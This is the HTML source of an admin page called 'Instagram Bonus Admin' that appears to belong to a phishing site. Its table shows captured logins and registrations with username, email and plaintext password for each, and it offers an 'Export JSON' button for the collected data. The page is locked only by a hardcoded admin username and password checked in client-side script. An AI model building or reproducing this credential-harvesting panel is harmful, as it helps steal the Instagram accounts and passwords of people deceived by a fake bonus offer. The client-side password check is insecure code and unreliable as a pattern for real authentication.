<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Bonus Admin</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="../style.css" />
  </head>
  <body class="admin-body">
    <div class="admin-shell">
      <header class="admin-header">
        <div>
          <p class="eyebrow">Admin dashboard</p>
          <h1>Instagram Bonus Leads</h1>
        </div>
        <div class="admin-actions">
          <a class="secondary-link" href="../index.html">Back to site</a>
          <button class="danger-btn" id="clearDataBtn" type="button">Clear local data</button>
        </div>
      </header>

      <section class="stats-grid">
        <div class="stat-box">
          <span>Total users</span>
          <strong id="totalUsers">0</strong>
        </div>
        <div class="stat-box">
          <span>Logins</span>
          <strong id="loginCount">0</strong>
        </div>
        <div class="stat-box">
          <span>Registrations</span>
          <strong id="signupCount">0</strong>
        </div>
      </section>

      <section class="table-card">
        <div class="table-header">
          <h2>Stored registrations</h2>
          <button class="secondary-btn" id="exportBtn" type="button">Export JSON</button>
        </div>

        <div class="table-wrap">
          <table>
            <thead>
              <tr>
                <th>#</th>
                <th>Type</th>
                <th>Username</th>
                <th>Email</th>
                <th>Password</th>
                <th>Date</th>
              </tr>
            </thead>
            <tbody id="usersTableBody"></tbody>
          </table>
        </div>
      </section>
    </div>

    <script>
      (function () {
        const ADMIN_USERNAME = "Berdiyor0711";
        const ADMIN_PASSWORD = "Berdiyor0711@";
        const shell = document.querySelector(".admin-shell");

        if (shell) {
          shell.style.filter = "blur(2px)";
          shell.style.pointerEvents = "none";
          shell.style.opacity = "0.35";
        }

        localStorage.removeItem("ig_admin_access");

        const overlay = document.createElement("div");
        overlay.id = "admin-lock";
        overlay.style.position = "fixed";
        overlay.style.inset = "0";
        overlay.style.background = "rgba(15, 23, 42, 0.7)";
        overlay.style.display = "grid";
        overlay.style.placeItems = "center";
        overlay.style.zIndex = "1000";

        const panel = document.createElement("div");
        panel.style.background = "#fff";
        panel.style.borderRadius = "14px";
        panel.style.padding = "28px 22px";
        panel.style.width = "min(90vw, 360px)";
        panel.style.boxShadow = "0 22px 60px rgba(0,0,0,0.2)";
        panel.innerHTML = `
          <h2 style="margin:0 0 12px; font-size:1.5rem;">Admin access</h2>
          <p style="margin:0 0 16px; color:#475569;">Only the owner can view this panel.</p>
          <input id="admin-username-input" type="text" value="Berdiyor0711" style="width:100%; padding:12px 14px; border:1px solid #dbeafe; border-radius:10px; margin-bottom:12px; box-sizing:border-box;" />
          <input id="admin-password-input" type="password" placeholder="Enter admin password" style="width:100%; padding:12px 14px; border:1px solid #dbeafe; border-radius:10px; margin-bottom:12px; box-sizing:border-box;" />
          <button id="admin-password-submit" type="button" style="width:100%; background:#2563eb; color:#fff; border:none; border-radius:10px; padding:12px; font-weight:700; cursor:pointer;">Open admin</button>
        `;

        overlay.appendChild(panel);
        document.body.appendChild(overlay);

        const usernameInput = document.getElementById("admin-username-input");
        const passwordInput = document.getElementById("admin-password-input");
        const submit = document.getElementById("admin-password-submit");

        submit.addEventListener("click", function () {
          const usernameValue = (usernameInput.value || "").trim();
          const passwordValue = (passwordInput.value || "").trim();

          if (usernameValue === ADMIN_USERNAME && passwordValue === ADMIN_PASSWORD) {
            localStorage.setItem("ig_admin_access", "true");
            overlay.remove();
            if (shell) {
              shell.style.filter = "none";
              shell.style.pointerEvents = "auto";
              shell.style.opacity = "1";
            }
            return;
          }

          usernameInput.style.borderColor = "#fda4af";
          passwordInput.style.borderColor = "#fda4af";
          passwordInput.value = "";
          passwordInput.placeholder = "Wrong login or password";
        });
      })();
    </script>
    <script src="../script.js?v=20260918"></script>
  </body>
</html>
